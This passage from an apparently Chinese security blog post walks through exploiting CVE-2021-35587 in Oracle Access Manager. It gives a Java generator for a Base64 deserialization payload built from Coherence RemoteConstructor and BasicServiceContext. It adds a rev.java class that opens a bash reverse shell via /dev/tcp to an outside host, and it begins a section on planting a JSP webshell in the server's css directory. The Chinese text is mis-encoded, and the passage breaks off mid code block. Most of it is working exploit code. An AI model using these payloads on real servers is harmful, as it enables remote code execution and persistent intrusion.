</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-60>60</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.coherence.servlet.AttributeHolder<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassDefinition<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassIdentity<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.RemoteConstructor<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> oracle.security.am.proxy.opensso.session.utils.SessionID<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.rmi.provider.BasicServiceContext<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Method<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.charset.StandardCharsets<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>genpoc</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        cve_2021_35587<span style=color:#f92672>(</span>rev<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2021_35587</span><span style=color:#f92672>(</span>Class poccls<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>poccls<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e>//è¿™ä¸€ç¯å¹¶éå¿…è¦ï¼Œå¯ä»¥ç®€åŒ–
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//AttributeHolder attributeHolder=new AttributeHolder();
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//Method setInternalValue=attributeHolder.getClass().getDeclaredMethod(&#34;setInternalValue&#34;,Object.class);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//setInternalValue.setAccessible(true);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//setInternalValue.invoke(attributeHolder,constructor);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//BasicServiceContext basicServiceContext=new BasicServiceContext(1,attributeHolder);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//ç›´æ¥å°†constructorè®¾ç½®åˆ°basicServiceContextä¸­
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        BasicServiceContext basicServiceContext<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> BasicServiceContext<span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>basicServiceContext<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Serializable<span style=color:#f92672>&gt;</span> String <span style=color:#a6e22e>oamserialize</span><span style=color:#f92672>(</span>T item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String data<span style=color:#f92672>=</span>serialize<span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>((</span><span style=color:#e6db74>&#34;object:&#34;</span><span style=color:#f92672>+</span>data<span style=color:#f92672>).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>(</span>StandardCharsets<span style=color:#f92672>.</span><span style=color:#a6e22e>UTF_8</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//   ref: https://gist.github.com/andy722/1524968
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Serializable<span style=color:#f92672>&gt;</span> String <span style=color:#a6e22e>serialize</span><span style=color:#f92672>(</span>T item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> ByteArrayOutputStream byteArrayOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> ObjectOutputStream objectOutputStream<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            objectOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span>byteArrayOutputStream<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            objectOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            objectOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>byteArrayOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>toByteArray</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=revjavaåå¼¹shell>rev.javaï¼šåå¼¹shell<a hidden class=anchor aria-hidden=true href=#revjavaåå¼¹shell>#</a></h2><h3 id=ä¼˜ç¼ºç‚¹>ä¼˜ç¼ºç‚¹<a hidden class=anchor aria-hidden=true href=#ä¼˜ç¼ºç‚¹>#</a></h3><p>ä¼˜ç‚¹ï¼š</p><ol><li>å¯ä»¥è·å¾—ä¸€ä¸ªshellã€‚è§†è§‰å†²å‡»å¼ºï¼Œäº’æ“ä½œæ€§å¼ºã€‚</li><li>æˆåŠŸç‡é«˜ã€‚ç”±æ¶æ„ç±»ä»£ç ç®€å•ï¼Œåªè¦ååºåˆ—åŒ–æˆåŠŸäº†å°±èƒ½æ‰§è¡Œåˆ°æ¶æ„ä»£ç ï¼Œä¸å­˜åœ¨åƒå†…å­˜é©¬é‚£æ ·éœ€è¦å¤æ‚çš„ã€ç‰ˆæœ¬ç›¸å…³çš„è·å–å„ç§å¯¹è±¡çš„è¿‡ç¨‹ï¼Œä¸ç¡®å®šå› ç´ è¾ƒå°‘ã€‚</li></ol><p>ç¼ºç‚¹ï¼š</p><ol><li>å¤šæ•°æƒ…å†µä¸‹åªèƒ½åå¼¹åˆ°å†…ç½‘ã€‚å¿…é¡»åœ¨æœåŠ¡ç«¯ç½‘ç»œå¯è¾¾çš„åœ°æ–¹æ¥æ”¶shellï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹è¿™æ„å‘³ç€æ”»å‡»è€…çš„ç½‘ç»œä½ç½®éœ€è¦åœ¨å†…ç½‘ã€‚</li><li>æŒä¹…åŒ–æ•ˆæœä¸€èˆ¬ã€‚ä¸€ä¸ªè¯·æ±‚åªèƒ½è·å¾—ä¸€ä¸ªshellï¼Œåå¼¹çš„shellè¿˜å®¹æ˜“è¶…æ—¶ï¼Œä¸€ç›´ä¿æŒçš„ç½‘ç»œè¿æ¥ä¹Ÿå®¹æ˜“å¼•èµ·è¿ç»´äººå‘˜çš„è­¦è§‰ã€‚</li></ol><h3 id=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ<a hidden class=anchor aria-hidden=true href=#æœ€ç»ˆæ•ˆæœ>#</a></h3><p><img loading=lazy src=image-20220701120445251.png alt=image-20220701120445251></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-14>14</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>rev</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//    ref: https://www.jianshu.com/p/ae3922db1f70
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>rev</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>			String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/172.18.0.1/2345 0&gt;&amp;1&#34;</span><span style=color:#f92672>};</span> 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wjspjavaéå†ç›®å½•å†™jspæœ¨é©¬>wjsp.javaï¼šéå†ç›®å½•å†™jspæœ¨é©¬<a hidden class=anchor aria-hidden=true href=#wjspjavaéå†ç›®å½•å†™jspæœ¨é©¬>#</a></h2><h3 id=æ¢ç´¢è¿‡ç¨‹>æ¢ç´¢è¿‡ç¨‹<a hidden class=anchor aria-hidden=true href=#æ¢ç´¢è¿‡ç¨‹>#</a></h3><p>è®¿é—®æœ¬åœ°OAMçš„ä¸»é¡µå‘ç°æœ‰ä¸€å¤„é™æ€æ–‡ä»¶ http://192.168.175.139:14100/oam/pages/css/login_page.css ï¼Œå¦‚æœæˆ‘ä»¬èƒ½åœ¨ /page/css/ è·¯å¾„ä¸‹æ”¾ä¸€ä¸ªjspæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±èƒ½å¾—åˆ°ä¸€ä¸ªwebshellã€‚</p><p>åœ¨OAMå®¹å™¨ä¸­å¯»æ‰¾login_page.csså‘ç°æœ‰ä¸¤å¤„ï¼ˆæ­£å¸¸æƒ…å†µä¸‹åº”è¯¥åªæœ‰ä¸€å¤„ï¼Œå› ä¸ºè¿™é‡Œæˆ‘é‡å¯è¿‡å®¹å™¨ï¼Œæ‰€ä»¥æœ‰å¤šå¤„ï¼‰ï¼š</p><p><img loading=lazy src=image-20220708101015991.png alt=image-20220708101015991></p><p>å¯ä»¥çœ‹åˆ°å…¶è·¯å¾„æ˜¯ <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam_server/xrd2uw/war/pages/css/login_page.css</code> ï¼Œå…¶ä¸­å­˜åœ¨éšæœºå­—ç¬¦ä¸² <code>xrd2uw</code> å’Œ <code>hukic2</code> ã€‚</p><p>å°è¯•å¾€ç›®å½•ä¸­å†™å…¥jspæ–‡ä»¶ï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œã€‚</p><p>ï¼ˆæœ‰äº›å¥‡æ€ªçš„æ˜¯ï¼Œç›´æ¥åœ¨ç£ç›˜ä¸Šé¢åˆ›å»ºçš„CSSæ–‡ä»¶å¯ä»¥è¢«è®¿é—®ï¼Œç›´æ¥åœ¨ç£ç›˜ä¸Šé¢åˆ›å»ºçš„JSPæ–‡ä»¶å´ä¸èƒ½è¢«è§£æå’Œè®¿é—®ï¼Œåªæœ‰é€šè¿‡ååºåˆ—åŒ–å†™è¿›å»çš„jspæ–‡ä»¶æ‰èƒ½å¤Ÿè¢«è§£æå’Œæ‰§è¡Œï¼Œè¿™ä¸€åº¦å¯¼è‡´æˆ‘è®¤ä¸ºå¾€è¿™ä¸ªç›®å½•å†™jspè¡Œä¸é€šã€‚ï¼‰</p><p>ï¼ˆåªæœ‰ç¬¬ä¸€æ¬¡å†™èƒ½ç”Ÿæ•ˆï¼Œé‡å†™jspæ–‡ä»¶å†…å®¹çš„è¯ï¼Œå› ä¸ºå·²ç»ç¼–è¯‘æˆclassäº†ï¼Œæ‰€ä»¥ä¿®æ”¹çš„å†…å®¹ä¸ä¼šç”Ÿæ•ˆã€‚ï¼‰</p><p><img loading=lazy src=image-20220701095527585.png alt=image-20220701095527585></p><p><img loading=lazy src=image-20220701095536512.png alt=image-20220701095536512></p><p>é‚£ä¹ˆé—®é¢˜çš„éš¾ç‚¹å°±å˜æˆäº†å¦‚ä½•é€šè¿‡Javaä»£ç æ‰¾åˆ°cssæ‰€åœ¨çš„ç›®å½•ï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ç›®æ ‡ä¸»æœºçš„éƒ¨ç½²è·¯å¾„ä¸­çš„éšæœºå­—ç¬¦ä¸²ã€‚</p><p>è¿™æ—¶å¾ˆè‡ªç„¶åœ°ä¼šé—®ä¸€ä¸ªé—®é¢˜ï¼Œå½“æˆ‘æ‰§è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæˆ‘æ‰€åœ¨å·¥ä½œç›®å½•æ˜¯ä»€ä¹ˆå‘¢ï¼Œæ˜¯å¦å¯ä»¥é€šè¿‡ç›¸å¯¹è·¯å¾„å»å†™jspï¼Ÿ</p><p>é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼ŒæŸ¥çœ‹æ‰§è¡Œååºåˆ—åŒ–æ—¶æ‰€åœ¨çš„å·¥ä½œç›®å½•ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-94-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-94-9> 9</a>
